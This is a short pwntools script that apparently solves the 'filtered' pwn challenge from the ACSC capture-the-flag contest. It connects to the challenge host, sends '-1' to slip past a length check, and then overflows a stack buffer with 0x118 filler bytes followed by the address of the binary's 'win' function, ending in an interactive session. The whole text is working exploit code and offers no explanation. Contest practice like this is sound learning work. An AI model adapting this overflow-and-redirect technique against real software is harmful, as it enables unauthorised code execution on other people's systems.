from pwn import * 

# p = process('./filtered')
# p = remote('filtered.chal.acsc.asia', 9001)
p = remote('167.99.78.201', 9001)
e = ELF('./filtered')

payload = b'A' * 0x118
payload += p64(e.symbols['win'])

p.sendline('-1')
p.sendline(payload)

p.interactive()
